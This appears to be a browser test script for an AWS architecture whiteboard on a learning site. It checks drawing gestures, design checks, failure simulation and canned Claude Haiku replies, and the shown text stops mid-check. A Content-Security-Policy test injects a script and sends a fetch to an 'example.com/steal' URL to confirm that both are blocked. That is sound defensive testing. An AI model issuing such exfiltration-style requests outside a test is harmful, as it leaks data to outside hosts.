// The design board in a real browser, against a built release in site/out:
//   CHROME_PATH=... node site/tools/designboard-check.mjs
// SITE_SCREENSHOTS=<dir> keeps a picture of the states it checks.
//
// Every gesture is driven the way a reader drives it: real pointer moves,
// clicks and keys at the places they are drawn, and every assertion reads the
// board as drawn or as saved, never a state this file wrote itself. (The one
// exception says so: building a sketch-4 design by hand takes forty gestures,
// and the gestures are each checked on their own above it.)
import { chromium } from "playwright";
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const root = join(dirname(fileURLToPath(import.meta.url)), "../..");
// Six real answers from claude-haiku-4-5 (2026-09-26), replayed as canned
// replies so the checks never spend anything or depend on the model's mood.
const readHaiku = () => JSON.parse(readFileSync(join(root, "site/designboard/test/haiku-drawings.json"), "utf8"));
const PORT = +(process.env.DESIGNBOARD_PORT || 8932);
// DESIGNBOARD_SITE=https://guide.soulful-ai.dev runs the same checks against
// the published site instead of a local build (no server is started).
const SITE = process.env.DESIGNBOARD_SITE || `http://127.0.0.1:${PORT}`;
const PAGE = `${SITE}/curriculum/03-production/01-system-design/whiteboard.html`;
const shots = process.env.SITE_SCREENSHOTS || mkdtempSync(join(tmpdir(), "designboard-"));
mkdirSync(shots, { recursive: true });

const server = process.env.DESIGNBOARD_SITE ? null : spawn(process.env.PYTHON || "python3.12", ["site/serve.py", String(PORT)], { cwd: root, stdio: ["ignore", "pipe", "pipe"] });
let browser;
const results = [];
async function check(name, fn) {
  const t0 = Date.now();
  try { await fn(); results.push(["ok", name, Date.now() - t0]); }
  catch (e) { results.push(["FAIL", name, Date.now() - t0, e.message.slice(0, 900)]); }
}

try {
  // Our own server, or nothing: a probe on a port another service held once
  // got "not found" for every page and looked like a bug in the page.
  if (server) await new Promise((resolve, reject) => {
    server.once("error", reject);
    server.once("exit", (code) => reject(new Error(`serve.py exited (${code}); is port ${PORT} taken?`)));
    setTimeout(resolve, 1500);
  });
  browser = await chromium.launch({ executablePath: process.env.CHROME_PATH || undefined, args: ["--no-sandbox", "--disable-dev-shm-usage"] });
  const context = await browser.newContext({ viewport: { width: 1440, height: 1000 }, deviceScaleFactor: +(process.env.SITE_SCREENSHOT_SCALE || 1) });
  // Every Content-Security-Policy refusal on the page, from the first byte.
  await context.addInitScript(() => {
    window.__csp = [];
    document.addEventListener("securitypolicyviolation", (e) => window.__csp.push({ directive: e.violatedDirective, blocked: e.blockedURI }));
  });
  const page = await context.newPage();
  // Anthropic is answered by whichever check is running, and by nobody
  // otherwise: an unrouted call is aborted, so no check can reach the real API
  // by accident. DESIGNBOARD_HAIKU_KEY (below) is the one deliberate exception.
  let anthropic = null;
  const sent = [];                                  // every request the page made, for "where did the key go"
  page.on("request", (r) => sent.push({ url: r.url(), headers: r.headers(), body: r.postData() || "" }));
  await page.route("https://api.anthropic.com/**", (route) => (anthropic ? anthropic(route) : route.abort()));
  const errors = [];
  page.on("pageerror", (e) => errors.push(e.message));
  page.on("console", (m) => { if (m.type() === "error" && !/favicon|status of 404/.test(m.text())) errors.push(m.text()); });
  page.on("response", (r) => { if (r.status() >= 400 && !/favicon\.ico$/.test(r.url())) errors.push(`${r.status()} ${r.url()}`); });

  // ---- helpers: everything a reader can see, found the way they would find it
  const B = (i) => page.locator(".db").nth(i);
  const state = (i) => page.evaluate((i) => JSON.parse(JSON.stringify(document.querySelectorAll(".db")[i].dbBoard.state)), i);
  const saved = (i) => page.evaluate((i) => { const b = document.querySelectorAll(".db")[i].dbBoard; return JSON.parse(localStorage.getItem(b.key) || "null"); }, i);
  // A logical canvas point, in viewport pixels. The first call brings the
  // WHOLE canvas into view (it fits: about 540 px), so every point measured for
  // one gesture agrees with every other. Centring each point instead scrolled
  // between measuring a part's dot and measuring where it went, and a "click"
  // on the dot became a drag of the part. Scrolls are instant: the guide
  // scrolls smoothly, and a position read mid-scroll is where the part was.
  async function at(i, x, y) {
    return page.evaluate(([i, x, y]) => {
      const svg = document.querySelectorAll(".db")[i].querySelector(".db-svg");
      let r = svg.getBoundingClientRect();
      if (r.top < 70 || r.bottom > innerHeight - 10) { scrollBy({ top: r.top - 90, behavior: "instant" }); r = svg.getBoundingClientRect(); }
      const vb = svg.viewBox.baseVal;             // 860 x 540, or more when a drawing zoomed the board out
      return { x: r.left + (x / vb.width) * r.width, y: r.top + (y / vb.height) * r.height };
    }, [i, x, y]);
  }
  // A palette tile dragged to a canvas point, both measured after the last scroll.
  async function dragTile(i, id, x, y, steps = 16) {
    await at(i, x, y);
    await tile(i, id).scrollIntoViewIfNeeded();
    const to = await at(i, x, y);
    const from = await tile(i, id).boundingBox();
    await drag({ x: from.x + from.width / 2, y: from.y + Math.min(20, from.height / 2) }, to, steps);
  }
  async function drag(from, to, steps = 12) {
    await page.mouse.move(from.x, from.y);
    await page.mouse.down();
    await page.mouse.move(to.x, to.y, { steps });
    await page.mouse.up();
    await page.waitForTimeout(60);
  }
  const node = (i, id) => B(i).locator(`.db-svg [data-node="${id}"]`);
  const edgeEl = (i, id) => B(i).locator(`.db-svg [data-edge="${id}"]`);
  const tile = (i, id) => B(i).locator(`.db-part[data-id="${id}"]`);
  async function clickTile(i, id) { await tile(i, id).scrollIntoViewIfNeeded(); await tile(i, id).click(); await page.waitForTimeout(40); }
  const newest = async (i, list) => (await state(i))[list].at(-1);
  const shot = (i, name) => B(i).screenshot({ path: join(shots, name) });

  // Two page styles are overridden for the instrument, never for the board:
  // the sticky reading bar (it lands mid-picture in element screenshots) and
  // smooth scrolling (a position read while the page is still moving is where
  // the part used to be, and a click becomes a drag).
  await check("four boards mount on a desktop, and each reference sketch waits behind a click", async () => {
    await page.goto(PAGE, { waitUntil: "load" });
    await page.addStyleTag({ content: ".reading-bar{position:static!important}html{scroll-behavior:auto!important}.read-progress{display:none!important}" });
    await page.evaluate(() => localStorage.clear());
    await page.reload({ waitUntil: "load" });
    await page.addStyleTag({ content: ".reading-bar{position:static!important}html{scroll-behavior:auto!important}.read-progress{display:none!important}" });
    assert.equal(await page.locator(".db").count(), 4);
    assert.equal(await page.locator("details.db-reference").count(), 4);
    assert.equal(await page.locator("details.db-reference[open]").count(), 0);
    for (let i = 0; i < 4; i++) assert.equal(await page.locator("details.db-reference").nth(i).locator("img[src*='/assets/mermaid/']").count(), 1, "each reference still holds its diagram");
    assert.match(await B(0).locator(".db-title").innerText(), /A bookmark must survive a restart/);
    assert.match(await B(3).locator(".db-brief").innerText(), /third-party API/);
    assert.equal(await B(0).locator(".db-check").count(), 4);
  });

  await check("the palette shows AWS's own icons, labelled, common parts first", async () => {
    const tiles = B(0).locator(".db-grid").nth(1).locator(".db-part");
    assert.ok(await tiles.count() >= 20);
    const labels = await tiles.allInnerTexts();
    for (const want of ["ALB", "SQS", "RDS", "ElastiCache", "Lambda", "API Gateway", "NAT gateway"]) assert.ok(labels.some((l) => l.trim() === want), `${want} is a common part`);
    const src = await tile(0, "sqs").locator("img").getAttribute("src");
    assert.match(decodeURIComponent(src), /Arch_Amazon-Simple-Queue-Service_48/, "the icon is AWS's file, by its own title");
  });

  await check("clicking a part adds it, labelled, and it is saved", async () => {
    await clickTile(0, "users");
    const n = await newest(0, "nodes");
    assert.equal(n.part, "users");
    assert.match(await node(0, n.id).textContent(), /Users/);
    assert.equal((await saved(0)).state.nodes.length, 1);
  });

  await check("dragging a part onto the canvas puts it where it is dropped", async () => {
    await dragTile(0, "alb", 300, 200, 20);
    const n = await newest(0, "nodes");
    assert.equal(n.part, "alb");
    assert.ok(Math.abs(n.x - 300) <= 6 && Math.abs(n.y - 200) <= 6, `dropped at ${n.x},${n.y}`);
  });

  await check("a drag that ends off the canvas adds nothing, and the next click still works", async () => {
    const before = (await state(0)).nodes.length;
    const from = await tile(0, "rds").boundingBox();
    await drag({ x: from.x + 10, y: from.y + 10 }, { x: from.x + 10, y: from.y - 300 }, 8);
    assert.equal((await state(0)).nodes.length, before);
    await clickTile(0, "ecs");
    assert.equal((await state(0)).nodes.length, before + 1, "a click after an abandoned drag must still add");
  });

  await check("search finds parts by what they do, and Enter adds the first", async () => {
    const box = B(0).locator(".db-search input");
    await box.fill("redis");
    const found = await B(0).locator(".db-part").allInnerTexts();
    assert.ok(found.some((t) => /ElastiCache/.test(t)), found.join("|"));
    await box.fill("postgres");
    assert.deepEqual((await B(0).locator(".db-part").allInnerTexts()).map((t) => t.trim()).sort(), ["Aurora", "RDS"]);
    await box.press("Enter");
    assert.equal((await newest(0, "nodes")).part, "rds", "Enter adds the first tile, and RDS comes first");
    await box.fill("zzzz");
    assert.match(await B(0).locator(".db-none").innerText(), /Nothing matches/);
    await box.fill("");
    assert.ok(await B(0).locator(".db-part").count() > 30);
  });

  await check("a part moves with a drag, and the board saves where it went", async () => {
    const alb = (await state(0)).nodes.find((n) => n.part === "alb");
    await drag(await at(0, alb.x, alb.y), await at(0, alb.x + 120, alb.y + 80));
    const moved = (await state(0)).nodes.find((n) => n.id === alb.id);
    assert.ok(Math.abs(moved.x - (alb.x + 120)) <= 6 && Math.abs(moved.y - (alb.y + 80)) <= 6, `${moved.x},${moved.y}`);
    assert.equal((await saved(0)).state.nodes.find((n) => n.id === alb.id).x, moved.x);
  });

  await check("dragging from a part's dot to another part draws an arrow", async () => {
    const s = await state(0);
    const users = s.nodes.find((n) => n.part === "users"), alb = s.nodes.find((n) => n.part === "alb");
    await page.mouse.move(...Object.values(await at(0, users.x, users.y)));       // hover shows the dot
    await drag(await at(0, users.x + 22 + 7, users.y), await at(0, alb.x, alb.y), 15);
    const e = (await state(0)).edges.find((x) => x.from === users.id && x.to === alb.id);
    assert.ok(e, "the arrow exists");
    assert.equal(await edgeEl(0, e.id).locator(".db-e-line").count(), 1);
  });

  await check("a dot dropped on empty canvas draws nothing, and moves nothing", async () => {
    const s = await state(0), users = s.nodes.find((n) => n.part === "users");
    await page.mouse.move(...Object.values(await at(0, users.x, users.y)));
    const dot = await at(0, users.x + 29, users.y), away = await at(0, 820, 500);
    await drag(dot, away);
    const after = await state(0);
    assert.equal(after.edges.length, s.edges.length);
    // "No new arrow" is also what dragging the part itself looks like, which is
    // how this check once passed while the part was carried across the canvas.
    const u2 = after.nodes.find((n) => n.id === users.id);
    assert.deepEqual([u2.x, u2.y], [users.x, users.y], "the part stayed where it was");
  });

  await check("the keyboard draws an arrow: select a part, Connect to", async () => {
    const s = await state(0), alb = s.nodes.find((n) => n.part === "alb"), ecs = s.nodes.find((n) => n.part === "ecs");
    await node(0, alb.id).focus();
    await page.keyboard.press("Enter");
    const select = B(0).locator(".db-toolbar .db-tb-connect");
    await select.selectOption(ecs.id);
    assert.ok((await state(0)).edges.some((e) => e.from === alb.id && e.to === ecs.id));
  });

  await check("double-click renames a part, and the name is drawn under its icon", async () => {
    const ecs = (await state(0)).nodes.find((n) => n.part === "ecs");
    const p = await at(0, ecs.x, ecs.y);
    await page.mouse.dblclick(p.x, p.y);
    const input = B(0).locator(".db-toolbar .db-tb-name");
    await input.waitFor();
    assert.equal(await input.evaluate((x) => x === document.activeElement), true, "the name field has focus");
    await page.keyboard.type("bookmarks-api");
    await page.keyboard.press("Enter");
    assert.equal((await state(0)).nodes.find((n) => n.id === ecs.id).name, "bookmarks-api");
    assert.match(await node(0, ecs.id).locator(".db-n-name").textContent(), /bookmarks-api/);
    assert.match(await node(0, ecs.id).locator(".db-n-part").textContent(), /^ECS$/);
  });

  await check("an arrow takes a label and guards, and shows both", async () => {
    const s = await state(0), e = s.edges[0];
    const a = s.nodes.find((n) => n.id === e.from), b = s.nodes.find((n) => n.id === e.to);
    const mid = await at(0, a.x + (b.x - a.x) * 0.3, a.y + (b.y - a.y) * 0.3);
    await page.mouse.click(mid.x, mid.y);
    await B(0).locator(".db-toolbar.is-edge").waitFor();
    await B(0).locator(".db-toolbar .db-tb-name").fill("POST /bookmarks");
    await B(0).locator('.db-toolbar [data-guard="timeout"]').click();
    const after = (await state(0)).edges.find((x) => x.id === e.id);
    assert.equal(after.label, "POST /bookmarks");
    assert.equal(after.guards.timeout, true);
    assert.equal(await B(0).locator('.db-toolbar [data-guard="timeout"]').getAttribute("aria-pressed"), "true");
    assert.match(await edgeEl(0, e.id).locator(".db-e-label").textContent(), /POST \/bookmarks .*timeout/);
    await B(0).locator('.db-toolbar [data-guard="timeout"]').click();
    assert.equal((await state(0)).edges.find((x) => x.id === e.id).guards.timeout, false, "and off again");
  });

  await check("reverse turns an arrow round", async () => {
    const e = (await state(0)).edges[0];
    await B(0).locator('.db-toolbar [data-tb="reverse"]').click();
    const r = (await state(0)).edges.find((x) => x.id === e.id);
    assert.deepEqual([r.from, r.to], [e.to, e.from]);
    await B(0).locator('.db-toolbar [data-tb="reverse"]').click();
  });

  await check("undo and redo walk the history from the keyboard", async () => {
    const before = await state(0);
    await clickTile(0, "sqs");
    assert.equal((await state(0)).nodes.length, before.nodes.length + 1);
    await B(0).locator(".db-stage").focus();
    await page.keyboard.press("Control+z");
    assert.equal((await state(0)).nodes.length, before.nodes.length);
    await page.keyboard.press("Control+Shift+z");
    assert.equal((await state(0)).nodes.length, before.nodes.length + 1);
  });

  await check("Delete removes the selected part and its arrows", async () => {
    const s = await state(0), q = s.nodes.find((n) => n.part === "sqs");
    const users = s.nodes.find((n) => n.part === "users");
    await page.keyboard.press("Escape");
    await drag(await at(0, users.x, users.y), await at(0, users.x, users.y), 1);     // select by clicking
    await page.mouse.move(...Object.values(await at(0, users.x, users.y)));
    await drag(await at(0, users.x + 29, users.y), await at(0, q.x, q.y), 12);       // an arrow into it
    assert.ok((await state(0)).edges.some((e) => e.to === q.id));
    const p = await at(0, q.x, q.y);
    await page.mouse.click(p.x, p.y);
    await page.keyboard.press("Delete");
    const after = await state(0);
    assert.ok(!after.nodes.some((n) => n.id === q.id));
    assert.ok(!after.edges.some((e) => e.to === q.id || e.from === q.id));
  });

  await check("a box drops from the palette, carries what is inside when it moves, and resizes", async () => {
    await page.keyboard.press("Escape");
    await dragTile(0, "vpc", 600, 330);
    const g = await newest(0, "groups");
    assert.ok(g && g.part === "vpc", "the VPC box was dropped");
    // A part dropped inside the box.
    await dragTile(0, "rds", g.x + 150, g.y + 160);
    const db = await newest(0, "nodes");
    assert.equal(db.part, "rds");
    // Move the box by its title bar: the database comes along.
    await drag(await at(0, g.x + 200, g.y + 10), await at(0, g.x + 160, g.y - 10), 10);
    const g2 = (await state(0)).groups.find((x) => x.id === g.id), db2 = (await state(0)).nodes.find((n) => n.id === db.id);
    assert.ok(g2.x !== g.x || g2.y !== g.y, "the box moved");
    assert.equal(db2.x - db.x, g2.x - g.x); assert.equal(db2.y - db.y, g2.y - g.y);
    // Resize from the corner handle.
    const handle = B(0).locator(".db-resize");
    const hb = await handle.boundingBox();
    await drag({ x: hb.x + hb.width / 2, y: hb.y + hb.height / 2 }, { x: hb.x - 60, y: hb.y - 40 }, 8);
    const g3 = (await state(0)).groups.find((x) => x.id === g.id);
    assert.ok(g3.w < g2.w && g3.h < g2.h, `${g2.w}x${g2.h} -> ${g3.w}x${g3.h}`);
    await shot(0, "1-drawing.png");
  });

  await check("Multi-AZ switches on for a database and shows on it", async () => {
    const db = (await state(0)).nodes.find((n) => n.part === "rds");
    const p = await at(0, db.x, db.y);
    await page.mouse.click(p.x, p.y);
    await B(0).locator('.db-toolbar [data-tb="multiaz"]').click();
    assert.equal((await state(0)).nodes.find((n) => n.id === db.id).multiAz, true);
    assert.equal(await node(0, db.id).locator(".db-b-multi").count(), 1);
  });

  await check("Check design marks what breaks a check in red, names it, and goes green when fixed", async () => {
    // As drawn: Users → ALB → bookmarks-api, and a database nothing writes to.
    await page.keyboard.press("Escape");
    await B(0).locator('[data-act="check"]').click();
    const strip = await B(0).locator(".db-strip").innerText();
    assert.match(strip, /of 4 hold/);
    await B(0).locator('.db-check[data-check="commitsToDb"]').click();
    assert.match(await B(0).locator(".db-detail").innerText(), /no request reaches (it|them) through your API/);
    const db = (await state(0)).nodes.find((n) => n.part === "rds");
    assert.equal(await node(0, db.id).getAttribute("class").then((c) => /is-bad/.test(c)), true, "the database is marked red");
    await shot(0, "2-failing.png");
    // Draw the missing arrow; the checks answer again without being asked.
    const api = (await state(0)).nodes.find((n) => n.part === "ecs");
    await page.mouse.move(...Object.values(await at(0, api.x, api.y)));
    await drag(await at(0, api.x + 29, api.y), await at(0, db.x, db.y), 14);
    await page.waitForTimeout(100);
    assert.equal(await B(0).locator('.db-check[data-check="commitsToDb"] .st-pass').count(), 1, await B(0).locator(".db-detail").innerText());
    assert.match(await B(0).locator(".db-detail").innerText(), /writes to/);
  });

  await check("an arrow AWS cannot make is refused by name, and Ctrl+Enter checks", async () => {
    const s = await state(0), db = s.nodes.find((n) => n.part === "rds"), api = s.nodes.find((n) => n.part === "ecs");
    await page.mouse.move(...Object.values(await at(0, db.x, db.y)));
    await drag(await at(0, db.x + 29, db.y), await at(0, api.x, api.y), 14);        // a reply drawn as an arrow
    await B(0).locator(".db-stage").focus();
    await page.keyboard.press("Control+Enter");
    await B(0).locator('.db-check[data-check="arrows"]').click();
    assert.match(await B(0).locator(".db-detail").innerText(), /answer travels back along it/);
    const bad = await B(0).locator(".db-edge.is-bad").count();
    assert.equal(bad, 1, "exactly the reply arrow is red");
    await B(0).locator(".db-edge.is-bad .db-e-hit").click({ force: true });
    await page.keyboard.press("Delete");
    assert.equal(await B(0).locator('.db-check[data-check="arrows"] .st-pass').count(), 1);
  });

  await check("hovering a part named in a sentence marks it on the board", async () => {
    await B(0).locator('.db-check[data-check="commitsToDb"]').click();
    const ref = B(0).locator(".db-detail .db-ref").first();
    const id = await ref.getAttribute("data-ref");
    await ref.hover();
    assert.match(await node(0, id).getAttribute("class"), /is-hover/);
    await page.mouse.move(5, 5);
  });

  await check("a tip starts from the approach and goes on; closing it hides it", async () => {
    await B(1).scrollIntoViewIfNeeded();
    await B(1).locator('[data-act="tip"]').click();
    assert.match(await B(1).locator(".db-tip").innerText(), /Tip 1 of \d+/);
    assert.match(await B(1).locator(".db-tip").innerText(), /Start from sketch 1/);
    await B(1).locator('.db-tip [data-tip="next"]').click();
    assert.match(await B(1).locator(".db-tip").innerText(), /Tip 2 of/);
    await shot(1, "3-tip.png");
    await B(1).locator(".db-tip-close").click();
    assert.equal(await B(1).locator(".db-tip").isHidden(), true);
  });

  await check("an empty sketch 2 offers to start from sketch 1, and copies it", async () => {
    const b = B(1).locator('[data-act="continue"]');
    assert.equal(await b.count(), 1);
    await b.click();
    const one = await state(0), two = await state(1);
    assert.equal(two.nodes.length, one.nodes.length);
    assert.deepEqual(two.edges.map((e) => [e.from, e.to]), one.edges.map((e) => [e.from, e.to]));
    await B(1).locator('[data-act="reset"]').click();
  });

  await check("Reset clears the board, and Undo in the strip brings it back", async () => {
    const before = await state(0);
    await B(0).locator('[data-act="reset"]').click();
    assert.equal((await state(0)).nodes.length, 0);
    assert.equal(await B(0).locator(".db-empty").count(), 1, "the empty hint is back");
    await B(0).locator('.db-strip [data-act="undo-reset"]').click();
    assert.equal((await state(0)).nodes.length, before.nodes.length);
  });

  await check("the board survives a reload", async () => {
    const before = await state(0);
    await page.reload({ waitUntil: "load" });
    await page.addStyleTag({ content: ".reading-bar{position:static!important}html{scroll-behavior:auto!important}.read-progress{display:none!important}" });
    await B(0).locator(".db-svg").waitFor();
    const after = await state(0);
    assert.equal(after.nodes.length, before.nodes.length);
    assert.equal(after.edges.length, before.edges.length);
    assert.equal(after.nodes.find((n) => n.part === "ecs").name, "bookmarks-api");
  });

  await check("the timer counts down from two minutes, pauses, and resets", async () => {
    const t = B(0).locator('[data-act="timer"]');
    await t.click();
    await page.waitForTimeout(2300);
    const running = await t.innerText();
    assert.match(running, /1:5[6-8]/, running);
    await t.click();
    const paused = await t.innerText();
    await page.waitForTimeout(1200);
    assert.equal(await t.innerText(), paused, "paused time stands still");
    assert.equal(await B(0).locator('[data-act="timer-reset"]').isVisible(), true);
    await B(0).locator('[data-act="timer-reset"]').click();
    assert.match(await t.innerText(), /2:00/);
    assert.equal(await B(0).locator('[data-act="timer-reset"]').isVisible(), false);
  });

  await check("break it: fail the database and saving goes down; bring it back and it works", async () => {
    await B(0).locator('[data-act="check"]').click();
    await B(0).locator('[data-act="break"]').click();
    assert.equal(await B(0).locator('[data-act="break"]').getAttribute("aria-pressed"), "true");
    assert.match(await B(0).locator(".db-strip").innerText(), /Save a bookmark\s*works/, JSON.stringify(await state(0)));
    const db = (await state(0)).nodes.find((n) => n.part === "rds");
    let p = await at(0, db.x, db.y);
    await page.mouse.click(p.x, p.y);
    assert.match(await B(0).locator(".db-strip").innerText(), /Save a bookmark\s*down/);
    assert.equal(await node(0, db.id).locator(".db-b-down").count(), 1);
    await shot(0, "4-break.png");
    p = await at(0, db.x, db.y);                     // the screenshot scrolled the page
    await page.mouse.click(p.x, p.y);
    assert.match(await B(0).locator(".db-strip").innerText(), /Save a bookmark\s*works/);
    await page.keyboard.press("Escape");
    assert.equal(await B(0).locator('[data-act="break"]').getAttribute("aria-pressed"), "false");
    assert.equal((await state(0)).nodes.length > 0, true, "breaking never changes the drawing");
  });

  // Building sketch 2's two-zone design takes dozens of gestures, each checked
  // above; here the design is set directly, and then only real clicks follow.
  const SKETCH2 = {
    groups: [
      { id: "g1", part: "vpc", name: "", x: 120, y: 20, w: 730, h: 505 },
      { id: "g2", part: "az", name: "us-east-1a", x: 300, y: 48, w: 265, h: 465 },
      { id: "g3", part: "az", name: "us-east-1b", x: 578, y: 48, w: 262, h: 465 },
      { id: "g6", part: "private", name: "", x: 310, y: 210, w: 245, h: 292 },
      { id: "g7", part: "private", name: "", x: 588, y: 210, w: 242, h: 292 },
    ],
    nodes: [
      { id: "n1", part: "users", name: "", x: 56, y: 160 }, { id: "n2", part: "alb", name: "", x: 212, y: 160 },
      { id: "n3", part: "ecs", name: "api-a", x: 432, y: 290 }, { id: "n4", part: "ecs", name: "api-b", x: 708, y: 290 },
      { id: "n5", part: "elasticache", name: "list-cache", x: 432, y: 420, multiAz: true }, { id: "n6", part: "rds", name: "bookmarks-db", x: 708, y: 420 },
    ],
    edges: [["n1", "n2"], ["n2", "n3"], ["n2", "n4"], ["n3", "n5"], ["n4", "n5"], ["n3", "n6"], ["n4", "n6"]].map(([from, to], k) => ({ id: "e" + (k + 1), from, to, label: "", guards: {} })),
  };

  await check("sketch 2: a single-zone database fails the zone check, and its button breaks that zone", async () => {
    await page.evaluate((s) => { const b = document.querySelectorAll(".db")[1].dbBoard; b.state = s; b.save(); b.render(); }, SKETCH2);
    await B(1).locator('[data-act="check"]').click();
    await B(1).locator('.db-check[data-check="survivesZone"]').click();
    const why = await B(1).locator(".db-detail").innerText();
    assert.match(why, /Losing us-east-1b takes/);
    assert.match(why, /Turn on Multi-AZ for bookmarks-db/);
    await B(1).locator('[data-act="try-zone"]').click();
    assert.equal(await B(1).locator('[data-act="break"]').getAttribute("aria-pressed"), "true");
    assert.match(await B(1).locator(".db-strip").innerText(), /Save a bookmark\s*down/);
    assert.match(await B(1).locator(".db-strip").innerText(), /Read the list\s*degraded/);
    await shot(1, "5-zone-down.png");
    // Click the zone again: back.
    const z = await at(1, 700, 150);
    await page.mouse.click(z.x, z.y);
    assert.match(await B(1).locator(".db-strip").innerText(), /Save a bookmark\s*works/);
    await page.keyboard.press("Escape");
  });

  await check("sketch 2: turning on Multi-AZ by hand makes the zone check hold", async () => {
    const p = await at(1, 708, 420);
    await page.mouse.click(p.x, p.y);
    await B(1).locator('.db-toolbar [data-tb="multiaz"]').click();
    await page.keyboard.press("Escape");
    assert.equal(await B(1).locator('.db-check[data-check="survivesZone"] .st-pass').count(), 1, await B(1).locator(".db-detail").innerText());
    assert.match(await B(1).locator(".db-strip").innerText(), /6\s+of 6 hold/);
    await shot(1, "6-all-hold.png");
  });

  await check("sketch 4: a hanging third party takes shared compute down, until the arrow has a timeout and a breaker", async () => {
    const S4 = {
      groups: [], edges: [["u", "alb"], ["alb", "api"], ["api", "db"], ["api", "tp"]].map(([from, to], k) => ({ id: "e" + (k + 1), from, to, label: "", guards: {} })),
      nodes: [{ id: "u", part: "users", name: "", x: 70, y: 260 }, { id: "alb", part: "alb", name: "", x: 230, y: 260 },
        { id: "api", part: "ecs", name: "api", x: 430, y: 260 }, { id: "db", part: "rds", name: "bookmarks-db", x: 640, y: 150 },
        { id: "tp", part: "thirdparty", name: "Preview API", x: 640, y: 380 }],
    };
    await page.evaluate((s) => { const b = document.querySelectorAll(".db")[3].dbBoard; b.state = s; b.save(); b.render(); }, S4);
    await B(3).locator('[data-act="break"]').click();
    const tp = await at(3, 640, 380);
    await page.mouse.click(tp.x, tp.y);
    assert.match(await B(3).locator(".db-strip").innerText(), /Save and read bookmarks\s*down/);
    assert.equal(await node(3, "api").locator(".db-b-stuck").count(), 1, "the shared compute is shown waiting");
    await shot(3, "7-hang.png");
    await B(3).locator('[data-act="break"]').click();                      // back to drawing
    const mid = await at(3, 430 + (640 - 430) * 0.35, 260 + (380 - 260) * 0.35);
    await page.mouse.click(mid.x, mid.y);
    await B(3).locator('.db-toolbar [data-guard="timeout"]').click();
    await B(3).locator('.db-toolbar [data-guard="breaker"]').click();
    await page.keyboard.press("Escape");
    await B(3).locator('[data-act="break"]').click();
    await page.mouse.click(tp.x, tp.y);
    assert.match(await B(3).locator(".db-strip").innerText(), /Save and read bookmarks\s*works/);
    await B(3).locator('[data-act="break"]').click();
  });

  // ----------------------------------------------------- Haiku draws
  const H = readHaiku();
  const FAKE_KEY = "sk-ant-api03-" + "k".repeat(93);
  const answer = (input, extra = {}) => ({ id: "msg_x", type: "message", role: "assistant", model: "claude-haiku-4-5",
    content: [{ type: "text", text: "HAIKU-SAID-THIS-1234" }, { type: "tool_use", id: "toolu_x", name: "draw", input }],
    stop_reason: "tool_use", usage: { input_tokens: 4000, output_tokens: 300 }, ...extra });
  const reply = (body, status = 200, delay = 0) => async (route) => {
    if (delay) await new Promise((r) => setTimeout(r, delay));
    await route.fulfill({ status, contentType: "application/json", headers: { "access-control-allow-origin": "*" }, body: JSON.stringify(body) }).catch(() => {});
  };
  const bar = (i) => B(i).locator(".db-haiku");
  const ask = async (i, text) => { await bar(i).locator(".db-haiku-in").fill(text); await bar(i).locator(".db-haiku-in").press("Enter"); };
  const idle = (i) => page.waitForFunction((i) => !document.querySelectorAll(".db")[i].classList.contains("is-drawing"), i, { timeout: 15000 });

  await check("the board page allows only its own scripts, talks only to itself and Anthropic, and nothing on it is refused", async () => {
    const policy = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute("content");
    assert.match(policy, /connect-src 'self' https:\/\/api\.anthropic\.com;/);
    assert.match(policy, /script-src 'self' 'sha256-[^']+' 'sha256-[^']+';/);
    const scriptSrc = policy.split(";").map((d) => d.trim()).find((d) => d.startsWith("script-src"));
    assert.doesNotMatch(scriptSrc, /unsafe/, "no inline script runs unless its hash is listed");
    assert.deepEqual(await page.evaluate(() => window.__csp), [], "the page as built breaks none of its own policy");
    // And the policy bites: a script added to the page does not run, and a
    // request anywhere but here and Anthropic is refused.
    const bite = await page.evaluate(async () => {
      const s = document.createElement("script"); s.textContent = "window.__ran = 1"; document.body.append(s);
      let fetched = "sent";
      try { await fetch("https://example.com/steal?k=1", { mode: "no-cors" }); } catch { fetched = "refused"; }
      await new Promise((r) => setTimeout(r, 50));
      return { ran: window.__ran === 1, fetched, violations: window.__csp.map((v) => v.directive) };
    });
    assert.equal(bite.ran, false, "an injected inline script ran");
    assert.equal(bite.fetched, "refused", "a request to another site went out");
    assert.ok(bite.violations.some((d) => d.startsWith("script-src")) && bite.violations.some((d) => d.startsWith("connect-src")), JSON.stringify(bite.violations));
    await page.evaluate(() => { window.__csp = []; });
  });

  await check("Haiku's bar sits under each canvas, and asks for a key before drawing; a claude.ai session is refused by name", async () => {
    await page.evaluate(() => { sessionStorage.clear(); localStorage.clear(); });
    await page.reload({ waitUntil: "load" });
    await page.addStyleTag({ content: ".reading-bar{position:static!important}html{scroll-behavior:auto!important}.read-progress{display:none!important}" });
    assert.equal(await page.locator(".db-haiku").count(), 4);
    const stage = await B(1).locator(".db-stage").boundingBox(), row = await bar(1).boundingBox();
    assert.ok(Math.abs(stage.x - row.x) < 2 && Math.abs(stage.width - row.width) < 2 && row.y >= stage.y + stage.height - 2, "the bar is the canvas's width, under it");
    anthropic = reply(answer(H["p1-alb-ecs-rds"].input));
    const before = sent.length;
    await ask(1, H["p1-alb-ecs-rds"].ask);
    assert.equal(await bar(1).locator(".db-keypanel").isVisible(), true, "no key: the panel opens");
    assert.equal(sent.slice(before).filter((r) => r.url.startsWith("https://api.anthropic.com")).length, 0, "nothing is sent without a key");
    await bar(1).locator(".db-key-in").fill("sk-ant-sid01-" + "s".repeat(90));
    await bar(1).locator('[data-act="key-save"]').click();
    assert.match(await bar(1).locator(".db-key-err").innerText(), /claude\.ai login session/);
    assert.equal(await page.evaluate(() => sessionStorage.getItem("j2s-anthropic-key") || localStorage.getItem("j2s-anthropic-key")), null, "a session token is never stored");
    await shot(1, "h1-key-panel.png");
  });

  await check("with a key, Haiku draws what was asked: the key goes only to Anthropic, the drawing lands, and none of Haiku's words do", async () => {
    const before = sent.length;
    await bar(1).locator(".db-key-in").fill(FAKE_KEY);
    await bar(1).locator('[data-act="key-save"]').click();      // saving goes straight on to draw what was typed
    await idle(1);
    const s = await state(1);
    assert.deepEqual(s.nodes.map((n) => n.part).sort(), ["alb", "ecs", "ecs", "rds", "users"]);
    assert.equal(s.groups.filter((g) => g.part === "az").length, 2);
